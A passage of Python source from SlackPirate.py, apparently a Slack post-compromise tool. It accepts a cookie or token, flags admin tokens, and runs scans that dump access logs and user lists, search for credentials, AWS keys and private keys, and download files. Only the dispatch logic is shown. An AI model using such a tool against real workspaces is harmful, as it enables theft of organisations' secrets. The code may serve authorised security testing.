
    if args.cookie is None and args.token is None:  # Must provide one or the other
        print(termcolor.colored("No arguments passed. Run SlackPirate.py --help ", "white", "on_red"))
        exit()
    elif args.cookie and args.token:  # May not provide both
        print(termcolor.colored("You cannot use both --cookie and --token flags at the same time", "white", "on_red"))
        exit()
    elif args.cookie:  # Providing a cookie leads to a shorter execution path
        display_cookie_tokens(cookie=dict(d=args.cookie), user_agent=selected_agent)
        exit()
    # Baseline behavior
    provided_token = args.token
    collected_scan_context = init_scanning_context(token=provided_token, user_agent=selected_agent)
    pathlib.Path(collected_scan_context.output_directory).mkdir(parents=True, exist_ok=True)
    print(termcolor.colored("INFO: Token looks valid! URL: " + collected_scan_context.slack_workspace
                            + " User: " + collected_scan_context.username, "white", "on_blue"))
    print(termcolor.colored("\n"))
    if check_if_admin_token(token=provided_token, scan_context=collected_scan_context):
        print(termcolor.colored("BINGO: You seem to be in possession of an admin token!", "white", "on_magenta"))
        print(termcolor.colored("\n"))
    print_interesting_information(scan_context=collected_scan_context)

    # Possible scans to run along with their flags
    flags_and_scans = [
        ('team_access_logs', dump_team_access_logs),
        ('user_list', dump_user_list),
        ('s3_scan', find_s3),
        ('credential_scan', find_credentials),
        ('aws_key_scan', find_aws_keys),
        ('private_key_scan', find_private_keys),
        ('pinned_message_scan', find_pinned_messages),
        ('link_scan', find_interesting_links),
        ('file_download', download_interesting_files),
    ]

    args_as_dict = vars(args)  # Using a dict makes the flags easier to check
    # delete the cookie and token args which are not scan filter related so we can run all() and any() on the dict values
    del args_as_dict['cookie']
    del args_as_dict['token']

    # no flags were specified - we run all scans
    no_flags_specified = all(value == None for value in args_as_dict.values())
    any_true = any(value == True for value in args_as_dict.values())  # are there any True flags?
    any_false = any(value == False for value in args_as_dict.values()) # are there any False flags?

    if no_flags_specified:
        for flag, scan in flags_and_scans:
            scan(token=provided_token, scan_context=collected_scan_context)
        exit()
    elif any_true and any_false:  # There were both True and False arguments
        print(
            termcolor.colored("You cannot use both enable flags and disable flags at the same time", "white", "on_red"))
        exit()
    elif any_true:  # There were only enable flags specified
        for flag, scan in flags_and_scans:
            if args_as_dict.get(flag, None):  # if flag is True, then run the scan
                scan(token=provided_token, scan_context=collected_scan_context)
    else:  # anyFalse - There were only disable flags specified
        for flag, scan in flags_and_scans:
            if not args_as_dict.get(flag, None) == False:  # if flag is not False (None), then run the scan
                scan(token=provided_token, scan_context=collected_scan_context)
